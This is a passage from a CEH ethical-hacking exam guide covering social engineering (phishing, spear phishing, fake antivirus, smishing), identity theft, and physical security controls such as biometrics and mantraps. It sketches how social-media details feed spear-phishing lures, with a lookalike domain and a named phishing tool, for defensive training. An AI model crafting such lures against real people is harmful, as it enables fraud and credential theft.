Prepare for a shock: computer-based social engineering attacks are those attacks carried out
with the use of a…computer. ECC lists several of these attack types, although there are
probably more we could imagine if we really thought about it. Attacks include specially
crafted pop-up windows, hoax e-mails, chain letters, instant messaging, spam, and phish-
ing. Add social networking to the mix, and things can get crazy in a hurry. A quick jaunt
around Facebook, Twitter, and LinkedIn can provide all the information an attacker needs
to profile, and eventually attack, a target. Lastly, although it may be little more involved,
why not just spoof an entire website or set up a rogue wireless access point? These may be
on the fuzzy edge of social engineering, but they are a gold mine for hackers.

NOTE One o my avorite social engineering attack names is “scareware.” It’s
basically phishing, or targeted malicious advertising, that scares the user
into purchasing or downloading and installing “security sotware.”

Social networking provides one of the best means for people to communicate with
one another and to build relationships to help further personal and professional goals.
Unfortunately, social networking also provides hackers with plenty of information on
which to build an attack profile. For example, consider a basic Facebook profile: date
of birth, address, education information, employment background, and relationships
with other people are all laid out for the picking. LinkedIn provides that and more—
showing exactly what specialties and skills the person holds, as well as peers they know
and work with.

12-ch12.indd 462 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

Chapter 12: Low Tech: Social Engineering and Physical Security

463

Information such as date of birth seems like legitimate information to mine from
social media, but is the rest of that fluff really all that important? Should we really spend
time reading others’ Facebook walls? I mean, seriously, what can you do with all those
arguments, posted videos of cats, and selfies? Well, consider the following as a small,
oversimplified, but very easy to pull off social media attack structure: Suppose you’re a
bad guy (or an ethical hacker hired to portray one) and want to gain access to Oinking
Pig Computing (a company I just made up, because the little pig toy I have on my desk
is begging to be a part of this book). You spend a little time researching OPC and find
this employee name Julie Nocab, who is active on Facebook a lot. Julie posts about
everything—where she goes, who she hangs out with, pictures of the food she eats, and
what projects at work really stink. By reading through these posts, you discover she
works for a guy named Bob Krop. You also discover she loves red wine, kayaking, and
hanging out with her friends, including somebody named Joe Egasuas, who also works
in her department.

You crack your virtual fingers and start thinking about what you can do with this
information. You could craft an e-mail to Julie from Bob, asking her about one of the
projects she was working on and telling her to open this Excel spreadsheet attachment
to update the status. You might also send her a message from Joe about one of their
favorite hangouts, alerting her that it was going to close. All she needs to do is click the
website link to read the story. Pretty simple example, but you get the drift. The filler for
these types of messages comes from the stuff people share on social media without even
thinking about it, and a little specific personalization goes a long way toward getting
someone to open your message and unwittingly install your access.

NOTE Abraham Lincoln once said, “No man has a good enough memory
to be a successul liar.” This applies in the social engineering world as well.
The more lies you tell, the more you’ll have to make true. I you pose as
someone’s riend, they’re ar more likely to recognize something unusual—
even an odd e-mail address. I you lie about what company you’re coming
rom, then you have to be prepared to make that company exist i asked.
The whole backstopping process is one where simplicity is oten the best
approach. To end on a quote, I think Mark Twain put it best: “I you tell the
truth, you don’t have to remember anything.”

Speaking of e-mail examples, probably the simplest and most common method of
computer-based social engineering is known as phishing. A phishing attack involves
crafting an e-mail that appears legitimate but in fact contains links to fake websites or
to download malicious content. The e-mail can appear to come from a bank, credit card
company, utility company, or any number of legitimate business interests a person might
work with. The links contained within the e-mail lead the user to a fake web form in
which the information entered is saved for the hacker’s use.

12-ch12.indd 463 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

CEH Certified Ethical Hacker All-in-One Exam Guide

464

NOTE Attackers who crat phishing e-mails are like any other community—
there are those who are really good at it and those who are really, really
bad. I the quality o the bait being used to deceive you is really good (or
example, using real project names, real personnel involved, and reerenced
insider inormation), not only is it coming rom one o the better attackers,
but you’re also probably being targeted speciically. I the e-mail is ull o
misspellings and concerned more with personal areas o your lie than with
your project, you’re probably looking at a poor phisher who’s just looking to
add bots to his army.

Phishing e-mails can be very deceiving, and even a seasoned user can fall prey to them.
Although some phishing e-mails can be prevented with good perimeter e-mail filters, it’s
impossible to prevent them all. The best way to defend against phishing is to educate
users on methods to spot a bad e-mail and hope for the best. Figure 12-1 shows an actual
e-mail I received a long while ago. Although a pretty good effort, it still screamed “Don’t
call them!” to me. Note the implied urgency, with all the official-looking logos all over
the place—after all, it just has to be real because nobody could cut and paste logos into
an e-mail…could they?

Figure 12-1
Phishing
example

12-ch12.indd 464 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

Chapter 12: Low Tech: Social Engineering and Physical Security

465

The following list contains items that may indicate a phishing e-mail—items that can
be checked to verify legitimacy:

• Beware unknown, unexpected, or suspicious originators As a general
rule, if you don’t know the person or entity sending the e-mail, you should be
suspicious. Even if the e-mail is from someone you know but the content seems
out of place or unsolicited, you should be cautious. In the case of Figure 12-1,
not only was this an unsolicited e-mail from a known business, but the address in
the “From” line was cap1fraud@prodigy.net—a far cry from the real Capital One
and a big indicator this was destined for the trash bin. Ensure the originator is
actually the originator you expect: cap1fraud@capital-one=fraud.com looks really
official, but it’s just as fraudulent as a plug nickel.

• Be aware of who the e-mail is addressed to We’re all cautioned to watch
where an e-mail’s from, but an indicator of phishing can also be the “To”
line itself, along with the opening e-mail greeting. Companies just don’t send
messages out to all users asking for information. They’ll generally address you,
personally, in the greeting instead of providing a blanket description: “Dear
Mr. Walker” vs. “Dear Member.” This isn’t necessarily an “a-ha!” moment, but
if you receive an e-mail from a (purportedly) legitimate business that doesn’t
address you by name, you may want to take caution. Besides, it’s just rude.

• Verify phone numbers Just because an official-looking 800 number is
provided does not mean it is legitimate. There are hundreds of sites on the
Internet to validate the 800 number provided. Be safe, check it out, and know
the friendly person on the other end actually works for the company you’re doing
business with. And as a quick note for the real world: professional attackers will
always have someone manning a fake 800 number to answer whatever phish
they’re trying (they’re also usually the supervisor of someone who might have
physically broken in).

• Beware bad spelling or grammar Granted, a lot of us can’t spell very well,
and I’m sure e-mails you receive from your friends and family have had some
“creative” grammar in them. However, e-mails from MasterCard, Visa, and
American Express aren’t going to have misspelled words in them, and they will
almost never use verbs out of tense. Note in Figure 12-1 that the second instance
of the word activity is misspelled.

NOTE Here’s a great real-world phishing example that is common and
successul: adding “–beneits” to the end o a company name. An e-mail
coming rom “YourCompany-Beneits.com” is almost always at least opened
by those inside YourCompany (watch a demo at https://www.youtube.com/
watch?v=DB6ywr9ngU). And why wouldn’t it be? It looks legitimate and
is something most in the corporate world see on a regular basis. Time this
appropriately (like, say, during open enrollments or company beneits), and
you’ve got a winner.

12-ch12.indd 465 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

CEH Certified Ethical Hacker All-in-One Exam Guide

466

• Always check links Many phishing e-mails point to bogus sites. Simply
changing a letter or two in the link, adding or removing a letter, changing the
letter o to a zero, or changing a letter l to the number 1 completely changes
the DNS lookup for the click. For example, www.capitalone.com will take you
to Capital One’s website for your online banking and credit cards. However,
www.capita1one.com will take you to a fake website that looks a lot like it but
won’t do anything other than give your user ID and password to the bad guys.
Additionally, even if the text reads www.capitalone.com, hovering the mouse
pointer over it will show where the link really intends to send you.

EXAM TIP You’ll probably see the Fake AV pop-up at some point on your
exam. There are a variety o dierent versions, but most are easy to pick
out. Fake AV (aka Rogue Security) allows an attacker potential access to
personally identiiable inormation such as billing address and credit card
details. Be sure to veriy any link in an e-mail or other notiication regarding
Fake AV or Rogue Security.

Another version of this attack is still phishing—in other words, it involves the use
of fake e-mails to elicit a response—but the objective base makes it different. While a
phishing attack usually involves a mass-mailing of a crafted e-mail in hopes of snagging
some unsuspecting reader, spear phishing is a targeted attack against an individual or a
small group of individuals within an organization. Spear phishing usually is a result of
a little reconnaissance work that has churned up some useful information. For example,
an attacker may discover the names and contact info for all the executives within an
organization, craft an e-mail specifically relevant to this group, and send it directly to
their e-mail addresses. In a cute little semantic spin-off, if the group targeted consists
of mainly high-level targets within the organization, the effort is referred to as whaling.

NOTE ShellPhish (https://github.com/suljot/shellphish) is among several
tools out there to help perorm phishing attacks.

But don’t forget that spear phishing can be used against a single target as well. Suppose,
for example, you discovered the contact information for a shipping and receiving
clerk inside the organization. Perhaps crafting an e-mail to look like a bill of lading or
something similar might be worthwhile?

EXAM TIP EC-Council also reerences two variants inside the umbrella o
phishing. First is something called pharming—the use o malicious code
o some sort that redirects a user’s web traic. This is known as “phishing
without a lure.” The second is called spimming, and it involves spam
messages over instant messaging.

12-ch12.indd 466 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

Chapter 12: Low Tech: Social Engineering and Physical Security

467

And one final note on spear phishing: perhaps not so surprisingly, spear phishing is
very effective—even more so than regular phishing. The reasoning for this comes down
to your audience: if the audience is smaller and has a specific interest or set of duties in
common, it makes it easier for the attacker to craft an e-mail that audience would be
interested in reading. In fact, because it is so successful, spear phishing is the number-one
social engineering attack in today’s world, with too many government organizations and
business entities falling prey to list here.

EXAM TIP Although nothing is oolproo, a couple o options can assist
in protecting against phishing. The Netcrat Extension and the PhishTank
Toolbar can help in identiying risky sites and phishing behavior. A sign-in
seal is an e-mail protection method that uses a secret message or image that
can be reerenced on any oicial communication with the site. This sign-in
seal is kept locally on your computer, so the theory is no one can copy or
spoo it.

Although phishing is probably the most prevalent computer-based social engineering
attack you’ll see, there are plenty of others. Many attackers make use of code to create
pop-up windows users will unknowingly click, as shown in Figure 12-2. These pop-
ups take the user to malicious websites where all sorts of badness is downloaded to
their machines, or users are prompted for credentials at a realistic-looking web front. A
common method of implementation is the prevalence of fake antivirus (AV) programs
taking advantage of outdated Java installations on systems. Usually hidden in ad streams
on legitimate sites, a Java applet is downloaded that, in effect, takes over the entire system,
preventing the user from starting any new executables. All that said, modern browsers
have developed a near hatred for Java due to all this nonsense, so it’s getting harder and
harder to pull off these attacks.

Figure 12-2
Fake AV pop-up

12-ch12.indd 467 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

CEH Certified Ethical Hacker All-in-One Exam Guide

468

NOTE Many companies employ training regarding phishing, but occasionally
even that can get out o hand. The semi-malicious ile you embedded to train
olks not to click links? Nothing to really worry about until User Joe orwards
it out o the environment and it spreads to 40 other businesses.

Another successful computer-based social engineering attack involves the use of
chat or messenger channels. Attackers not only use chat channels to find out personal
information to employ in future attacks, but they make use of the channels to spread
malicious code and install software. In fact, Internet Relay Chat (IRC) is one of the
primary ways zombies (computers that have been compromised by malicious code and
are part of a “botnet”) are manipulated by their malicious code masters.

Mobile-Based Attacks
Generally speaking, I despise made-up memorization terms solely for exam purposes,
and I used to look at this section in the same way. But recently my thoughts on the
matter have changed, since mobile computing, and subsequently mobile attacks, have
become so ubiquitous in our lives. Don’t get me wrong—I’m still no fan of memoriza-
tion terms—but there’s no ignoring the fact that social engineering not only can work
on mobile devices, but one could argue it’s becoming one of the primary attack vectors
for it. For example, consider the “fool-proof” two-factor authentication measures banks
and other sites use now—log in on the PC, then have a code texted to you to complete
the process. With most of our security eyeballs trained on desktop security, doesn’t the
mobile side of it become the logical target?

For example, consider ZitMo (ZeuS-in-the-Mobile), a piece of malware that turned
up on Android phones all over the place. Attackers knew two-factor authentication was
taking place, so ZitMo was designed to capture the phone itself, ensuring the one-time
passwords also belonged to the bad guys. The target would log on to their bank account
and see a message telling them to download an application on their phone in order to
receive security messages. Thinking they were installing security, victims instead were
installing a means for the attacker to have access to their user credentials (sending the
second authentication factor to both victim and attacker via text).

Other malware types activated an SMS message from the victim’s phone that was sent
to request premium services. The attacker would then delete any return SMS messages
acknowledging the charges, ensuring the victim would have no idea this was going on
until a giant cell phone bill arrived in the mail. Change that just a tad to send messages
to everyone in the user’s contact list and cha-ching—now the attacker has several phones
unknowingly installing and charging to his services.

Mobile-based social engineering attacks are those that take advantage of mobile
devices—in particular, their applications and services—to carry out their end goal.
Whereas phishing and pop-ups fall under computer-based social engineering attacks,
mobile-based social engineering attacks show up as an app or SMS issue. EC-Council
defines four categories of mobile-based social engineering attacks:

• Publishing malicious apps An attacker creates an app that looks like, acts like,
and is named similarly to a legitimate application.

12-ch12.indd 468 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

Chapter 12: Low Tech: Social Engineering and Physical Security

469

• Repackaging legitimate apps An attacker takes a legitimate app from an app
store and modifies it to contain malware, posting it on a third-party app store for
download. For example, this once happened with a version of Angry Birds.

• Fake security applications This one actually starts with a victimized PC.
The attacker infects a PC with malware and then uploads a malicious app to an
app store. Once the user logs in, a malware pop-up advises them to download
bank security software to their phone. The user complies, thus infecting their
mobile device.

• SMS An attacker sends SMS text messages crafted to appear as legitimate
security notifications, with a phone number provided. The user unwittingly
calls the number and provides sensitive data in response. Per EC-Council, this
is known as “smishing.”

EXAM TIP You’ll most likely only see a couple o questions dealing with
mobile-based social engineering attacks. Just remember, during your exam,
i the attack deals with a mobile application or an SMS text, it’s mobile based.

I know you’re thinking that this was a very short section and, surely, I must have
left something out. While I could go on and on with mobile-based social engineering
attack stories and malware examples from Internet searches, I’ve scoured the ECC official
courseware and, I promise you, this is all you need for mobile-based social engineering.
As often repeated throughout this book, you need to keep abreast of this topic as each
day goes by. Research mobile vulnerabilities and threats just as you would desktop and
network ones, and give mobile security the care and concern it deserves.

Preventing Social Engineering Attacks
And, finally, we couldn’t have a discussion on social engineering attacks without at least a
cursory mention of how to prevent them. Setting up multiple layers of defense, including
change-management procedures and strong authentication measures, is a good start, and
promoting policies and procedures is also a good idea. You can set up other physical and
technical controls, but the only real defense against social engineering is user education.
Training users—especially those in technical-support positions—on how to recognize
and prevent social engineering is the best countermeasure available.

In the real world, though, defense against a very skilled social engineer may be nearly
impossible. Social engineering preys on the very things that make us human, and a
successful attack really comes down to the right person for the right situation. Male,
female, old, young, sexy, ugly, muscular, or thin, it all matters, and it matters differently
in different situations. The true social engineering master can figure out what they need
to be in a matter of seconds, and before you know it, the attacker who is a pure alpha male
in real life turns into a floor-staring introvert in order to achieve the goal. Recognizing
what is needed—what role to play, what people in the room will respond to, and so on—
is the hard part and is what separates the very successful from the also-rans.

12-ch12.indd 469 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

CEH Certified Ethical Hacker All-in-One Exam Guide

470

“That’ll Never Happen to Me”
Identity theft is a real, nonstop, ever-present threat in our information age, and no
one—not even you, my highly educated and security-minded reader—is immune.
It’s amazing to me that every time someone hears a story about identity theft or
scams, they always have the same reaction regarding the victim: “Those poor unedu-
cated buffoons, how could they fall for something that obvious?” But if this were a
Jeopardy episode and the preceding title was revealed for the Daily Double, I’d hit
my buzzer and respond with “What’s something every victim of identity theft says
before they become a victim?”

Since the first edition of this book, I’ve been revisiting statistics and sources on all
sorts of data points, and identity theft is no exception. As I pulled up statistics on ID
theft each time, I had some expectations, based on history and current events at the
time, that there would be declines in overall numbers, and maybe some definitive
indicators of those most vulnerable. After all, I thought each time, we’re smarter
now, right? There are ads, TV shows, and movies talking about ID theft. Heck,
there are multiple companies who do nothing but ID theft prevention and recovery.
So of course it’ll be better this time.

For four straight editions, I’ve been wrong. Each time the number has gone
up, and each time the data was a bit bleaker. So this go-round I went in with
no expectation at all to find good news. But, perhaps, there is a little kernel of
bright news in what I found. According to the U.S. Department of Justice (https://
bjs.ojp.gov/library/publications/victims-identity-theft-2018) and multiple other
resources, statistics on ID theft show it’s not just the naive among us falling
victim, it’s everyone, but the good news is the numbers appear to have dropped.
Just over 14 million Americans have their identities used fraudulently each year
(about 1 in 15 people in the United States), with each reported instance averaging
approximately $1343 in losses, but that number is down from 17.6 million in the
previous Department of Justice report.

Good news so far, but what about narrowing down who we need to focus more
education and preventative measures toward? In other words, if we can find out
which groups fall victim most often maybe we can prevent even more identity
theft. Perhaps, for example, the actual geographic location victims live in can give a
clue. Or maybe gender. Or marital status. Or race. Age, maybe? Preference between
Xbox and PS5? Proclivity to eat fish fried (as God intended) versus grilled?

The bad news is, there doesn’t seem to be any glaring anomalies or standouts. Men
and women were statistically equally likely to be victimized, although technically
more women seem to fall victim to ID theft than men. As for age group, it turns out
that’s not a definitive indicator either. Fewer than 1 percent of 16- and 17-year-olds
experienced ID theft, and just 1 percent of 18- to 24-year-olds were targeted. Every
other age group is a statistical dead heat, with 50- to 64-year-olds taking the slight
lead (mainly due to medical record theft).

12-ch12.indd 470 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

Chapter 12: Low Tech: Social Engineering and Physical Security

471

The only statistical differences in groups come down to ethnicity, income,
and, surprisingly, where you live. Whites were almost three times more likely to
be victimized than any other ethnicity, and income levels of $75,000 and above
blow away lower-income brackets when it comes to ID theft. Interestingly, it’s
not the income or ethnicity that seems to be the catch in these groups (ID thieves
don’t necessarily have any idea what income level the target is at), but more the
use of income. High-income earners tend to spend more, and they use their credit
cards and IDs much more frequently than other groups. This provides more of
a target-rich environment for the bad guys, so not surprisingly higher-income
groups tend to fall victim more frequently. As for where you live, Florida, Georgia,
California, Michigan, and Nevada were by far the worst ID theft states to live in,
while residents of North Dakota, South Dakota, Hawaii, Maine, and Iowa report
many fewer ID theft activities.

In any case, it’s worth noting that statistics can be misleading. It may well be that
higher income levels simply report ID theft at a higher rate because of the hope of
criminal prosecution and reclamation of loses; somebody stealing $20 isn’t as likely
to get you as outraged as someone stealing $20,000. Not to mention $100K seems
to be some sort of cutoff for investigative authorities to take action—small crime
does indeed seem to pay against tons of innocents. And geography may have more
to do with population numbers than any real threat to your identity. ID theft occurs
across all designators, however you try to categorize people, and the methods to
pull it off are easy and oftentimes silent. Any attacker can rifle through the trash to
find telephone or utility bills and use them at certain DMV offices to garner a new
driver’s license in another’s name, and the educated 40-year-old computer-literate
person wouldn’t even know it was going on.

What’s truly concerning in all the ID theft statistics is this sobering note: the
overwhelming majority of ID theft victims did not even know they were being victimized
and only discovered the ID theft when the criminal’s activity caused a roadblock in
their life—a credit card was declined or they discovered a bad credit rating while
trying to buy a car or a home. If the attacker is smart, by doing things such as paying
the minimum on credit cards opened in the victim’s name to keep things running, it
could take months and sometimes even years to even know the extent of the damage.
It’s rare that the victim can point to any specific instance where their ID was stolen, so
it’s very difficult to pinpoint the vulnerable access points for ID theft.

So what’s the answer to all this? How do you prevent ID theft when oftentimes
you don’t even know it’s going on? There really isn’t one way to mitigate against ID
theft; there are several. You can take steps to prevent ID theft by shredding your
documents, signing up for various identity protection services, keeping watch over
your credit, and visiting the FTC’s site on ID theft (a list of the top, most recent
scams can be found here: https://www.consumer.ftc.gov/scam-alerts). Stay vigilant
with your records and keep an eye out for anything weird. Much like many medical
conditions, catching identify theft early is key.

12-ch12.indd 471 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

CEH Certified Ethical Hacker All-in-One Exam Guide

472

Physical Security
Physical security is perhaps one of the most overlooked areas in an overall security pro-
gram. For the most part, all the NIDS, HIDS, firewalls, honeypots, and security policies
you put into place are pointless if you give an attacker physical access to the machines.
And you can kiss your job goodbye if that access reaches into the network closet, where
the routers and switches sit.

So just how much focus on physical security, from either a security professional or an
attacker mentality, is warranted? Consider the case of Sister Megan Rice, an 84-year-old
nun, who, alongside two other accomplices, cut a hole through a fence and walked up
to the Highly Enriched Uranium Materials Facility (HEUMF) at the National Nuclear
Security Administration’s Y-12 National Security Complex. She literally broke into one
of the supposedly most secured locations on the planet and didn’t even get so much
as a hello from anyone in security until she walked up to a guard and surrendered.
Thankfully, these “attackers” only wanted to make a statement decrying the money the
U.S. government spends on weapons and the military, and only defaced a bunker, hung
banners, and strung crime-scene tape. Suppose they’d had other ideas and plans? Suppose,
instead of hammering off a small chunk of the HEUMF, they’d planted something to
blow a hole in it. Or worse. Think physical security is important now?

And one final note on physical security as a whole, before we dive into what you’ll
need to know for your exam: as a practical matter, and probably one we can argue from
the perspective of Maslow’s hierarchy of needs, physical security penetration is often seen
as far more personal than cyber-penetration. For example, a bad guy can tell Company X
that he has remotely taken their plans and owns their servers, and the company will react
with, “Ah, that’s too bad. We’ll have to address that.” But if he calls and says he broke into
the office at night, sat in the CEO’s chair, and installed a keylogger on the machine, an
apoplectic meltdown will ensue. Hacking is far more about people than it is technology,
and that’s never truer than when using physical methods to enable cyber activities.

Physical Security 101
Physical security includes the plans, procedures, and steps taken to protect your assets
from deliberate or accidental events that could cause damage or loss. Normally people
in our particular subset of IT tend to think of locks and gates in physical security, but
it also encompasses a whole lot more. You can’t simply install good locks on your doors
and ensure the wiring closet is sealed off to claim victory in physical security; you’re also
called to think about those events and circumstances that may not be so obvious. These
physical circumstances you need to protect against can be natural, such as earthquakes
and floods, or man-made, ranging from vandalism and theft to outright terrorism. The
entire physical security system needs to take it all into account and provide measures to
reduce or eliminate the risks involved.

Furthermore, physical security measures come down to three major components:
physical, technical, and operational. Physical measures include all the things you can touch,
taste, smell, or get shocked by. Concerned about someone accidentally (or purposefully)
ramming their vehicle through the front door? You may want to consider installing

12-ch12.indd 472 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

Chapter 12: Low Tech: Social Engineering and Physical Security

473

bollards across the front of the building to prevent attackers from taking advantage of
the actual layout of the building and parking/driveways. Other examples of physical
controls include lighting, locks, fences, and guards with Tasers or accompanied by highly
trained German shepherds. Technical measures are a little more complicated. These are
measures taken with technology in mind to protect explicitly at the physical level. For
example, authentication and permissions may not seem like physical measures, but if you
think about them within the context of smartcards and biometrics, it’s easy to see why
they should be considered technical measures for physical security. Operational measures
are the policies and procedures you set up to enforce a security-minded operation. For
example, background checks on employees, risk assessments on devices, and policies
regarding key management and storage would all be considered operational measures.

EXAM TIP Know the three major categories o physical security measures—
physical, technical, and operational—and be able to identiy examples
o each.

To get you thinking about a physical security system and the measures you’ll need to
take to implement it, it’s helpful to start from the inside out and draw up ideas along the
way. For example, apply the thought process to this virtual room we’re standing in. Look
over there at the server room, and the wiring closet just outside. Are there numerous
physical measures we’ll need to implement for both? You bet there are.

Power concerns, the temperature of the room, static electricity, and the air quality itself
are just a few examples of physical security considerations. Dust clogging fans and vents can
be a killer, believe me, and controlling humidity with a humidity-control system is really
important, considering static electricity can be absolutely deadly to computer systems. To
combat static electricity, anti-static mats and wrist straps, along with proper grounding
techniques, should be implemented whenever folks are working on the systems.

Along that line of thinking, the ducts carrying air in and out need special attention.
Positive pressure (increasing air pressure inside the room so that it’s greater than that
outside the room) might mess up a few hairstyles, but it will greatly reduce the number
of contaminants allowed in. And while we’re on the subject, what about the power to all
this? Do we have backup generators for all these systems? Is our air conditioning unit
susceptible? Attackers knocking out our AC system could effectuate an easy denial of
service on our entire network, couldn’t they? What if they attack and trip the water sensors
for the cooling systems under the raised floor in our computer lab?

How about some technical measures to consider? Do we have to use a PIN and
a proximity badge to even get into the room? What about the authentication of the
server and network devices themselves? If we allow remote access to them, what kind of
authentication measures are in place? Are passwords used appropriately? Is there virtual
separation—that is, a DMZ they reside in—to protect against unauthorized access?
Granted, these aren’t physical measures by their own means (authentication might cut
the mustard, but location on a subnet sure doesn’t), but they’re included here simply to
continue the thought process of examining the physical room.

12-ch12.indd 473 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

CEH Certified Ethical Hacker All-in-One Exam Guide

474

Continuing our example, let’s move around the room together and look at other
physical security concerns. What about the entryway itself? Is the door locked? If so,
what is needed to gain access to the room? Perhaps a key? If so, what kind of key and how
hard is it to replicate? In demonstrating a new physical security measure to consider—an
operational one, this time—who controls the keys, where are they located, and how are
they managed? And what if we’re using an RFID access card that processes all sorts of
magic on the back side—like auto-unlocking doors and such? Are we doing anything to
protect against that being skimmed and used against us? We’ve already covered enough
information to employ at least two government bureaucrats and we’re not even outside
the room yet. You can see here, though, how the three categories work together within an
overall system.

NOTE You’ll oten hear that security is “everyone’s responsibility.” Although
this is undoubtedly true, some people hold the responsibility a little more
tightly than others. The physical security oicer (i one is employed),
inormation security employees, and the CIO are all accountable or the
system’s security.

Another term you’ll need to be aware of is access controls. Access controls are physical
measures designed to prevent access to controlled areas. They include biometric controls,
identification/entry cards, door locks, and mantraps. Each of these is interesting in its
own right.

Biometrics includes the measures taken for authentication that come from the
“something you are” concept. We’ve hit on these before, and I won’t belabor the point
much here, but I just want to restate the basics in regard to physical security. Biometrics
can include fingerprint readers, face scanners, retina scanners, and voice recognition (see
Figure 12-3). The greatest aspect of using biometrics to control access—whether physically
or virtually—is that it’s difficult to fake a biometric signature (such as a fingerprint). The
downside, though, is a related concept: because the nature of biometrics is so specific,
it’s easy for the system to read false negatives and reject a legitimate user’s access request.

Figure 12-3
Biometrics

12-ch12.indd 474 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

Chapter 12: Low Tech: Social Engineering and Physical Security

475

Death of the Password?
I’m probably safe in saying that almost everyone reading this book hates passwords.
If you’re like me, you have dozens of them, and on occasion you either forget one or
lose it, prompting a day’s worth of work ensuring everything is safely changed and
backed up. Passwords just don’t work; they create a false sense of security and seem-
ingly cause more aggravation than a sense of peace. An older study showed that the
1000 most common passwords found are used on more than 91 percent of all sys-
tems tested (https://www.passwordrandom.com/most-popular-passwords). Want to
know something even more disturbing? Almost 70 percent of those studied use the
same password on multiple sites. And things haven’t gotten much better—run your
own search for “Most common passwords” and see for yourself.

The use of biometrics was supposed to be a new dawn in authentication, freeing
us from password insanity. The idea of “something you are” sounded fantastic, right
up until the costs involved made it prohibitive to use in day-to-day operation. Not
to mention, the technology just isn’t reliable enough for the average guy to use on
his home PC. For example, I have a nice little fingerprint scanner right here on my
laptop that I never use because it is entirely unreliable and unpredictable. So, where
do we turn for the one true weapon that will kill off the password? If “something I
know” and “something I am” won’t work, what’s left?

One possible answer for password death may come in the form of “something you
have,” embedding two-factor authentication into a USB stick. One such example
has a really weird-sounding name. The YubiKey (https://www.yubico.com) is a basic
two-factor authentication token that works right over a standard USB port. The
idea is brilliant—every time it’s used, it generates a one-time password that renders
previously used passwords useless. So long as the user has the token and knows
their own access code, every login is fresh and secure; however, it doesn’t necessarily
answer all the ills. What happens if the token is stolen or lost? What happens if the
user forgets their code to access the key? Even worse, what if the user logs in and
then leaves the token in the machine?

I could go on and on, but the point is made: we’re still stuck with passwords, and
in fact we’re stuck with hashes. Biometrics system in place? Your identity is a hash.
RSA tokens added to the fray? You’re still a hash. Add smartcards, passwords, and
PINs? Yup. Still a hash. All these efforts are making headway, but we’re still a long
way off. The idea of one-time passwords isn’t new and is making new strides, but
it’s not time to start celebrating the password’s death just yet. Between accessing
the system itself and then figuring out how to pass authentication credentials to
the multiple and varied resources we try to access on a daily basis, the death of the
password may indeed be greatly exaggerated.

When it comes to measuring the effectiveness of a biometric authentication system,
the FRR, FAR, and CER are key areas of importance. False rejection rate (FRR) is the
percentage of times a biometric reader denies access to a legitimate user. The percentage of
times that an unauthorized user is granted access by the system, known as false acceptance
rate (FAR), is the second major factor. FRR and FAR are usually graphed on a chart, and

12-ch12.indd 475 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

CEH Certified Ethical Hacker All-in-One Exam Guide

476

the intercepting mark, known as crossover error rate (CER), becomes a ranking method to
determine how well the system functions overall. For example, if one fingerprint scanner
had a CER of 4 and a second scanner had a CER of 2, the second scanner would be a
better, more accurate solution.

From the “something you have” authentication factor, identification and entry cards
can be anything from a simple photo ID to smartcards and magnetic swipe cards. Also,
tokens can be used to provide access remotely. Smartcards have a chip inside that can
hold tons of information, including identification certificates from a PKI system, to
identify the user. Smartcards may also have RFID features to “broadcast” portions of
the information for “near swipe” readers. Tokens generally ensure at least a two-factor
authentication method because you need the token itself and a PIN you memorize to go
along with it.

NOTE Here’s something to think about. I a user changes passwords every
30 days, she will generate a new hash or Windows authentication, but i
the biometric signature never changes, neither will the hash. What about
smartcard and PIN? I bet most users won’t bother to change their PIN
annually, much less every 30 days. Whether it’s passwords, smartcards,
tokens, or biometric signatures, they’re all just authentication mechanisms
creating a hash. Ater that...well, they don’t do anything.

The mantrap, now also known as the access control vestibule, is designed as a pure
physical access control and provides additional control and screening at the door or
access hallway to the controlled area. In the mantrap, two doors are used to create a
small space to hold a person until appropriate authentication has occurred. The user
enters through the first door, which must shut and lock before the second door can be
cleared. Once inside the enclosed room, which normally has clear walls, the user must
authenticate through some means—biometric, token with PIN, password, and so on—
to open the second door (Figure 12-4 shows one example from Hirsch Electronics). If
authentication fails, the person is trapped in the holding area until security can arrive and
come to a conclusion.

Figure 12-4
Mantrap

12-ch12.indd 476 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

Chapter 12: Low Tech: Social Engineering and Physical Security

477

Usually mantraps are monitored with video surveillance or guards, and from experience
I can tell you they can be quite intimidating. If you’re claustrophobic at all, there’s a
certain amount of palpable terror when the first door hisses shut behind you, and a
mistyped PIN, failed fingerprint recognition, or—in the case of the last one I was trapped
in—a bad ID card chip will really get your heart hammering. Add in a guard or two
aiming a gun in your direction, and the ambiance jumps to an entirely new level of terror.

A few final thoughts on setting up a physical security program are warranted here. The
first is a concept I believe anyone who has opened a book on security in the past 20 years
is already familiar with—layered defense. The “defense in depth” or “layered security”
thought process involves not relying on any single method of defense but, rather, stacking
several layers between the asset and the attacker. In the physical security realm, these are
fairly easy to see: if your data and servers are inside a building, stack layers to prevent the
bad guys from getting in. Guards at an exterior gate checking badges and a swipe card
entry for the front door are two protections in place before the bad guys are even in the
